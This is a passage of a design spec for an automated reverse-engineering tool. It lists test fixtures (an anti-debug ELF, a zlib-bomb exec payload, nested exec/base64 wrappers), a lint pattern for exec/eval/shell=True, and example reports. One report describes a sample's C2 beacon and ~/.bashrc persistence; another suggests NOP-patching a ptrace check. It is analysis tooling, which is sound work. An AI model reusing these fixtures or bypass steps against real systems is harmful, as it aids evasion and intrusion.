Assert a `pyc` child layer; its meta (helper JSON) lists the constant
`revauto_marshal_marker`; `T-MARSHAL` present; and a `code-object` block exists.
If the helper fails on the host (e.g. `subprocess` forbidden), the check
accepts the documented fallback (raw string scan finds the marker) — but it
must not crash.

**S8 — binary fallback on the test ELF (MUST).** Build
`_build_revauto_test_elf()` (pattern of `disasm.build_test_elf`: one `PT_LOAD`,
sections `.text`, `.rodata`, `.shstrtab`) where:
- `.text` = `lea rdi,[rip+flagstr]` (48 8d 3d rel32); `mov eax,101` (b8 65 00 00 00);
  `syscall` (0f 05); `rdtsc` (0f 31); `mov eax,60` (b8 3c 00 00 00); `syscall`;
  `ret` (c3);
- `.rodata` = `b"Enter the flag: \0"` + `b"flag{elf_fallback_ok}\0"` (target of
  the LEA) + `b"/proc/self/status\0"` + AES S-box first 16 bytes + 4 u32 of the
  SHA-256 IV (LE).
Run `analyze(data, "test.elf", Options(engine="auto"), engines=Engines(None,
None, None, capstone=bool(disasm.capstone)))`. Assert:
1. `report.lane == "binary"`, `engines["r2"].status == "skipped"` (auto, r2
   absent), `engines["ghidra"].status == "not-requested"`, builtin status `ok`.
2. `render_text` contains every section header: SUMMARY, HEADERS, PROTECTIONS,
   ENGINE, IMPORTS, FUNCTIONS, STRINGS, CRYPTO, ANTI-DEBUG, SYSCALLS,
   NEXT STEPS (IMPORTS may read `(none — static or stripped)`).
3. `binary["crypto"]` names include `AES S-box` and `SHA-256 IV`, with
   offsets inside `.rodata`.
4. `binary["syscalls"]` contains names `ptrace` and `exit`; tells contain
   `T-PTRACE`, `T-TIMING`, `T-PROC-SELF`.
5. `binary["strings"]` has `flag{elf_fallback_ok}` tagged `FLAG` with ≥ 1 xref
   whose site is in `.text`; the flag is in `summary.flags`.
6. ≥ 1 function (entry) with actions mentioning `ptrace`.
7. Also run the same on `disasm.build_test_elf()`: no exception, string
   `hello ctf` present with an xref.
8. JSON: `json.loads(json.dumps(report_to_dict(report)))["binary"]["format"]
   == "ELF64"`.

**S9 — r2 absent, explicit request (MUST).** (The ENGINE section renders
statuses upper-case: `OK`, `SKIPPED`, `ERROR`, `NOT-REQUESTED`.) `engines =
detect_engines(which=lambda name: None)` → `r2_path is None`,
`ghidra_path is None`. `analyze(elf, opts=Options(engine="r2"),
engines=engines)` → no exception; `engines["r2"].status == "skipped"`;
`"not found"` in reason; builtin sections still present. Through the CLI:
temporarily set `revauto._WHICH = lambda n: None`, write the ELF to a temp
file, `run([path, "--engine", "r2"])` returns `1`, captured stdout contains
`SKIPPED` and `== FUNCTIONS ==`; restore `_WHICH` in `finally`.
Same for `--engine ghidra` (status skipped, rc 1).

**S10 — r2 digest parsing with a fake backend (MUST).**
`FakeR2` implementing `R2Session` from a dict of canned outputs (`aflj` with
mixed `offset`/`addr` keys, `iij`, `izj` with one base64-encoded legacy string,
`axtj` for one string, `/asj` empty, one key returning invalid JSON). Inject via
`Engines(r2_path="/fake/r2", ..., r2_backend_factory=lambda path, opts: FakeR2(...))`.
Assert: status `ok`; merged functions include the canned names with
`source == "r2"`; the legacy base64 string is decoded; xref attached to the
right string; the invalid-JSON key produced a note, not an error.
**S10b (conditional):** if `shutil.which("r2") or shutil.which("radare2")` on
the host, run the real backend on the S8 ELF with timeout 30; assert no
exception and status in `("ok", "error")`; print `[SKIP] real r2 not
installed` otherwise (a skip is not a failure).

**S11 — ghidra script + parser (MUST).** `_GHIDRA_SCRIPT` contains
`class RevautoDigest extends GhidraScript`, `getScriptArgs`,
`DecompInterface`, `DefinedDataIterator`, `getReferencesTo`. Inject
`ghidra_runner` returning canned Appendix-A JSON; assert functions merged
with `source == "ghidra"` and a `decompiled["main"]` entry rendered under
`== DECOMPILED ==`.

**S12 — JSON schema (MUST).** For S2's report: `report_to_dict` round-trips
through `json`; top-level keys equal the §6.2 set; `schema == "revauto/1"`;
no `bytes` anywhere (custom walker).

**S13 — robustness + caps (MUST).**
1. `analyze(b"")` (via CLI: empty temp file) → `run` rc 1, no traceback.
2. Fuzz: 50 deterministic pseudo-random inputs (`random.Random(1337)`), sizes
   0–4 096, plus truncated prefixes of the S2/S4/S8 fixtures → `analyze` never
   raises.
3. Zip bomb: `exec(zlib.decompress(base64.b64decode(<zlib of 40 MiB of 'A'>)))`
   → finishes, layer size ≤ `MAX_LAYER_OUT`, `T-SIZE-CAP` present.
4. Depth: 12 nested `exec(base64.b64decode(...))` wrappers (not more — each
   wrapper grows the fixture by 4/3) → stops at depth 8
   with `T-DEPTH-CAP`; with `Options(max_depth=0)` → exactly 1 layer.
5. Cycle: a fixture whose decoded payload equals an earlier layer → note
   containing `cycle`, no infinite loop.

**S14 — CLI contract (MUST).** `run([])`, `run(["-h"])` → 0;
`run(["--bogus"])`, `run(["x", "--lane", "nope"])`,
`run(["x", "--flag-format", "("])` → 2; `run(["/nonexistent/file"])` → 1;
`run(["engines"])` → 0; `run([py_tmp, "--json"])` → 0 and stdout parses as
JSON; `run([py_tmp, "--dump-layers", tmpdir])` → 0 and `L3.py` exists with
content `final`; running it again → 1 (refuses to overwrite).
(`run(["selftest"])` is **not** called from inside `selftest`.)

**S15 — PE minimal (MUST).** `_build_revauto_test_pe()`: PE32+, sections
`.text` (contains `0f 31` and `c3`) and `.rdata` (an import descriptor for
`KERNEL32.dll` importing `IsDebuggerPresent` and `VirtualAlloc` by name, plus
the string `CyberSci{pe_ok}`); data directory 1 points at the descriptor.
Assert format `PE32+`, imports parsed with both names, tells `T-ANTI-DEBUG`
and `T-MEMORY-EXEC`, flag found, `T-TIMING` from rdtsc.

---

## 12. Acceptance criteria (review checklist for the implementation PR)

1. `python3 toolkit/recon.py --selftest` → `17/17 modules passed` on a host
   **without** r2, ghidra, capstone, r2pipe (the CI runner) — and on Kali with
   them.
2. `python3 toolkit/recon.py revauto selftest` and `… revauto --selftest` both
   run the selftest (exit 0); `python3 toolkit/modules/revauto.py selftest`
   works standalone.
3. All S1–S15 checks exist with the names given and pass.
4. Exit codes match §4 for every row.
5. No placeholder code: no `pass`-only bodies, no `TODO`, no
   `NotImplementedError`. Every public function has type hints + docstring.
6. Offline/safety: S1 lint passes; `grep -nE "shell=True|eval\(|exec\(" modules/revauto.py`
   shows only string constants / comments / the lint's own name sets.
7. The fallback binary report on a real Kali binary (`/bin/ls`, stripped,
   PIE) with `--engine none` finishes < 10 s without capstone and lists:
   protections, ≥ 50 imports grouped by category, functions including
   `main`-candidate or entry, strings with xrefs, NEXT STEPS. (Manual check;
   paste output in the PR.)
8. Compact report for the S2 sample ≤ 70 lines, every line ≤ 100 cols.
9. README modules table gets a `revauto` row; `PLAN.md` status line updated
   (see §16).
10. No change to `recon.py`, `modules/__init__.py`, or any other module
    (except the README / PLAN docs). If a sibling helper is needed that is not
    public, revauto implements its own.

---

## 13. Limits and performance budgets

| scenario | budget |
|---|---|
| script lane, 1 MiB obfuscated Python, 3 layers | < 2 s |
| script lane, 5 MiB minified JS | < 5 s |
| binary builtin, 10 MiB ELF, no capstone | < 8 s |
| binary builtin + r2 `aaa`, 2 MiB ELF | bounded by `--timeout` (default 120 s) |
| selftest (no engines) | < 6 s |

Implementation hints: pre-compile all regexes at module level; byte scans use
`bytes.find` loops or `re.finditer` on bytes, never per-byte Python loops over
whole sections except where unavoidable (syscall look-back is local);
entropy windows use `collections.Counter` over slices with step 128.

---

## 14. Out of scope / stretch (MAY, separate issues)

- JSFuck / aaencode / jjencode **decoding** (detect-only here).
- obfuscator.io string-array **rotation** and RC4 string decoding.
- Python control-flow-flattening reversal; full Python decompilation of
  bytecode (we only `dis`).
- PyInstaller CArchive extraction (hint only).
- Lua / PHP / VBA / batch-file lanes (PHP `eval(base64_decode(gzinflate(…)))`
  is the most likely next lane: MAY add as `php` with the same transform table).
- ARM / AArch64 / MIPS code scans in the builtin path (headers, strings,
  imports, crypto still work).
- `batch` integration (`batch` routing text files through `revauto`) — a
  follow-up one-line change in `batch`, its own PR.
- Binary checker solving (symbolic) — out of scope; `strcmp` against literal is
  already surfaced by STRINGS + FUNCTIONS.

---

## 15. Suggested build order inside the single PR

1. Data model, caps, `_stage`, rendering skeleton, CLI + exit codes (S14 minus
   lanes), S1 lint.
2. Transforms + Python folder + layer engine (S2 1–3, S13 3–5).
3. Annotator + rules + IOCs + tells/scores + checker (S2 4–8, S3).
4. Marshal helper + pickle (S6, S7).
5. JS tokenizer/folder/packer (S4); shell (S5); ps1/html/blob extras.
6. Binary builtin (S8, S15), then r2 backend (S9, S10), ghidra (S11).
7. Fuzz/caps (S13), docs (§16), manual `/bin/ls` check (§12.7).

Commit in that order inside the PR so review can follow the layers.

---

## 16. Docs to update in the implementation PR

- `toolkit/README.md` modules table row:
  `| revauto | automated RE analyst: auto-detects and unwraps obfuscated Python/JS/shell layers (base64/zlib/hex/char-code/lambda/marshal/pickle/packer/pipe-to-sh) with pure transforms only -- never executes the payload; labels every function/block with what it does (network, file, exec, crypto, persistence, ...), IOCs, tells with line refs, flag-checker solver; ELF/PE digest via radare2 (r2pipe or r2 -2 subprocess) or ghidra analyzeHeadless when present, else a stdlib fallback (protections, imports by category, functions, strings+xrefs, crypto constants, anti-debug, syscalls). \`recon.py revauto <file\|-> [--deep] [--json] [--engine auto\|r2\|ghidra\|none] [--dump-layers DIR]\` |`
- `toolkit/README.md` requirements paragraph: mention r2/r2pipe/ghidra as
  opt-in engines for `revauto`.
- `toolkit/PLAN.md`: change the `revauto` row (added by this PR) to
  IMPLEMENTED and the status line to `17/17`.

---

## Appendix A — Ghidra post-script template (`_GHIDRA_SCRIPT`)

Java (Ghidra ≥ 10.2 headless). The implementer embeds this verbatim as a
string constant (escape as needed). It cannot be compiled in CI; keep it
conservative (only long-stable API). Output JSON written by hand to avoid
dependencies.

```java
// RevautoDigest.java -- generated by toolkit/modules/revauto.py. Read-only analysis digest.
import ghidra.app.script.GhidraScript;
import ghidra.app.decompiler.DecompInterface;
import ghidra.app.decompiler.DecompileResults;
import ghidra.program.model.address.Address;
import ghidra.program.model.listing.Data;
import ghidra.program.model.listing.Function;
import ghidra.program.model.listing.FunctionIterator;
import ghidra.program.model.symbol.Reference;
import ghidra.program.model.symbol.Symbol;
import ghidra.program.model.symbol.SymbolIterator;
import ghidra.program.util.DefinedDataIterator;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class RevautoDigest extends GhidraScript {
    private static String q(String s) {
        if (s == null) return "null";
        StringBuilder b = new StringBuilder("\"");
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"': b.append("\\\""); break;
                case '\\': b.append("\\\\"); break;
                case '\n': b.append("\\n"); break;
                case '\r': b.append("\\r"); break;
                case '\t': b.append("\\t"); break;
                default:
                    if (c < 0x20) b.append(String.format("\\u%04x", (int) c));
                    else b.append(c);
            }
        }
        return b.append('"').toString();
    }

    @Override
    public void run() throws Exception {
        String[] args = getScriptArgs();
        String outPath = args.length > 0 ? args[0] : "revauto_ghidra.json";
        int maxDecomp = args.length > 1 ? Integer.parseInt(args[1]) : 3;
        StringBuilder sb = new StringBuilder();
        sb.append("{\"program\":").append(q(currentProgram.getName()));
        sb.append(",\"functions\":[");
        Map<String, Integer> strRefs = new HashMap<>();
        FunctionIterator fit = currentProgram.getFunctionManager().getFunctions(true);
        boolean first = true;
        int nf = 0;
        while (fit.hasNext() && !monitor.isCancelled() && nf < 20000) {
            Function f = fit.next();
            nf++;
            if (!first) sb.append(',');
            first = false;
            sb.append("{\"name\":").append(q(f.getName()));
            sb.append(",\"addr\":").append(f.getEntryPoint().getOffset());
            sb.append(",\"size\":").append(f.getBody().getNumAddresses());
            sb.append(",\"thunk\":").append(f.isThunk());
            sb.append(",\"external\":").append(f.isExternal());
            sb.append(",\"calls\":[");
            Set<Function> called = f.getCalledFunctions(monitor);
            boolean fc = true;
            for (Function c : called) {
                if (!fc) sb.append(',');
                fc = false;
                sb.append(q(c.getName()));
            }
            sb.append("]}");
        }
        sb.append("],\"imports\":[");
        SymbolIterator ext = currentProgram.getSymbolTable().getExternalSymbols();
        first = true;
        while (ext.hasNext()) {
            Symbol s = ext.next();
            if (!first) sb.append(',');
            first = false;
            sb.append("{\"name\":").append(q(s.getName()));
            sb.append(",\"lib\":").append(q(s.getParentNamespace().getName())).append('}');
        }
        sb.append("],\"strings\":[");
        first = true;
        int ns = 0;
        for (Data d : DefinedDataIterator.definedStrings(currentProgram)) {
            if (monitor.isCancelled() || ns >= 5000) break;
            ns++;
            Address a = d.getAddress();
            if (!first) sb.append(',');
            first = false;
            sb.append("{\"addr\":").append(a.getOffset());
            sb.append(",\"value\":").append(q(d.getDefaultValueRepresentation()));
            sb.append(",\"xrefs\":[");
            boolean fx = true;
            int nx = 0;
            for (Reference r : getReferencesTo(a)) {
                if (nx++ >= 32) break;
                Function rf = getFunctionContaining(r.getFromAddress());
                if (!fx) sb.append(',');
                fx = false;
                sb.append("{\"from\":").append(r.getFromAddress().getOffset());
                sb.append(",\"func\":").append(q(rf == null ? null : rf.getName())).append('}');
                if (rf != null) strRefs.merge(rf.getName(), 1, Integer::sum);
            }
            sb.append("]}");
        }
        sb.append("],\"decompiled\":{");
        List<Function> targets = new ArrayList<>();
        for (Function f : currentProgram.getFunctionManager().getFunctions(true)) {
            if (f.getName().equals("main")) targets.add(0, f);
        }
        List<Map.Entry<String, Integer>> ranked = new ArrayList<>(strRefs.entrySet());
        ranked.sort((x, y) -> y.getValue() - x.getValue());
        for (Map.Entry<String, Integer> e : ranked) {
            if (targets.size() >= maxDecomp) break;
            for (Function f : getGlobalFunctions(e.getKey())) {
                if (!f.isThunk() && !f.isExternal() && !targets.contains(f)) { targets.add(f); break; }
            }
        }
        DecompInterface ifc = new DecompInterface();
        ifc.openProgram(currentProgram);
        first = true;
        for (Function f : targets) {
            if (monitor.isCancelled()) break;
            DecompileResults r = ifc.decompileFunction(f, 30, monitor);
            if (r == null || !r.decompileCompleted() || r.getDecompiledFunction() == null) continue;
            if (!first) sb.append(',');
            first = false;
            sb.append(q(f.getName())).append(':').append(q(r.getDecompiledFunction().getC()));
        }
        ifc.dispose();
        sb.append("}}");
        try (Writer w = new OutputStreamWriter(new FileOutputStream(outPath), StandardCharsets.UTF_8)) {
            w.write(sb.toString());
        }
    }
}
```

Canned JSON for S11 (shape the parser must accept; addresses are integers):

```json
{"program": "test.elf",
 "functions": [{"name": "entry", "addr": 4194424, "size": 24, "thunk": false, "external": false, "calls": []},
               {"name": "main", "addr": 4194448, "size": 64, "thunk": false, "external": false, "calls": ["strcmp"]}],
 "imports": [{"name": "strcmp", "lib": "libc.so.6"}],
 "strings": [{"addr": 4194560, "value": "\"flag{ghidra_ok}\"", "xrefs": [{"from": 4194452, "func": "main"}]}],
 "decompiled": {"main": "int main(void)\n{\n  return strcmp(buf, \"flag{ghidra_ok}\");\n}\n"}}
```

(The parser strips the surrounding quotes that `getDefaultValueRepresentation`
adds to string values.)

---

## Appendix B — Example compact reports (targets, not byte-exact)

Script lane (S2 sample):

```
== SUMMARY ==
  chall.py: Python script, 3 obfuscation layers unwrapped, 6 parts, risk high
  flow: INPUT -> COMPARE_CHECK -> NETWORK(10.13.37.5:4444) -> PERSISTENCE(~/.bashrc)
  behaviours: DYNAMIC_CODE, NETWORK, FILE_WRITE, PERSISTENCE, ENCODING, INPUT, COMPARE_CHECK
  risk: 88/100 (high, tell density)   obfuscation: 60/100 (heavy, 3 layers)
  flags: flag{p4t_v4l_th3_tr0l}
== LAYERS ==
  [H] L0 py   input                                   182 B
  [H] L1 py   via exec   hex -> utf8          @L0:1    305 B
  [H] L2 py   via exec   reverse -> b64 -> zlib @L1:1  120 B
  [H] L3 py   via exec   b64 -> zlib          @L2:2    611 B   (final)
== PARTS == (final layer L3)
  [H] imports (L3:1-2): imports socket, os, base64
  [H] top-level (L3:2-4): sets builtins.REVAUTO_CANARY; defines C2 = 'http://10.13.37.5:8080/beacon'; defines KEY (22 ints)
  [H] function `beacon` (L3:5-8): opens socket; connects to ('10.13.37.5', 4444); sends data; encodes data (base64.b64encode)
  [H] function `persist` (L3:9-11): writes file ~/.bashrc; references persistence location ~/.bashrc
  [H] function `check` (L3:12-13): compares input transform with constant KEY (flag checker)
  [H] main-guard (L3:14-16): reads user input. calls: check(), beacon(), persist()
== CHECKERS ==
  [H] L3:13 xor 0x42 vs KEY -> flag{p4t_v4l_th3_tr0l}
== TELLS ==
  [H] high   L0:1   T-DECODE-EXEC     exec(bytes.fromhex(...).decode())
  [H] high   L1:1   T-DECODE-EXEC     lambda: zlib(b64(reverse(arg))) -> exec
  [M] medium L1:1   T-LAMBDA-WRAPPER  lambda-wrapped decoder `_`
  [H] high   L3:10  T-PERSIST         append to ~/.bashrc
  …
== IOCS ==
  [H] flag     flag{p4t_v4l_th3_tr0l}           L3:13 (solved checker)
  [H] url      http://10.13.37.5:8080/beacon    L3:3
  [H] ip_port  10.13.37.5:4444                  L3:7
  [M] path     ~/.bashrc                        L3:10
  [M] path     /tmp/.x.py                       L3:11
== NEXT STEPS ==
  - recon.py revauto chall.py --deep --dump-layers ./layers   (cleaned source of L3)
```

Binary lane (S8 ELF, no engine, no capstone):

```
== SUMMARY ==
  test.elf: ELF64 x86-64 EXEC, static, stripped, 1 functions, 0 imports, engine builtin
  behaviours: ANTI_ANALYSIS, CRYPTO
  risk: 44/100 (medium, tell density)
  flags: flag{elf_fallback_ok}
  engine: builtin (r2 absent, ghidra not requested, capstone absent - hex view)
== HEADERS ==
  ELF64 little x86-64 EXEC entry 0x400078 interp (none)
== PROTECTIONS ==
  NX DISABLED (no PT_GNU_STACK)  PIE no  Canary not found  RELRO None  FORTIFY no
== ENGINE ==
  r2: SKIPPED (radare2 not found on PATH)   ghidra: NOT-REQUESTED   builtin: OK (0.01s)
== IMPORTS ==
  (none — static or stripped)
== FUNCTIONS ==
  [L] entry @0x400078 (heuristic): refs "flag{elf_fallback_ok}"; syscall ptrace (101); rdtsc timing check; syscall exit (60)
== STRINGS ==
  [H] FLAG     0x4000a0  "flag{elf_fallback_ok}"   xref 0x400078 (entry)
  [H] PROMPT   0x400090  "Enter the flag: "
  [H] ANTI     0x4000b6  "/proc/self/status"
== CRYPTO ==
  [H] AES S-box     off 0xc8  vaddr 0x4000c8 (.rodata)
  [H] SHA-256 IV    off 0xd8  vaddr 0x4000d8 (.rodata)
== ANTI-DEBUG ==
  [H] ptrace syscall @0x40007f (entry)
  [M] rdtsc timing   @0x400081 (entry)
  [M] "/proc/self/status" string (TracerPid check?)
== SYSCALLS ==
  ptrace x1, exit x1
== DISASM == (entry; capstone not installed - hex view only)
  00400078  48 8d 3d .. ..
== NEXT STEPS ==
  - recon.py gdbkit find ptrace           (bypass the ptrace check)
  - recon.py elfpatch nop test.elf --at 0x40007f --len 2 -o patched   (NOP the ptrace syscall)
  - install capstone for real disassembly; radare2 for function/xref recovery
```
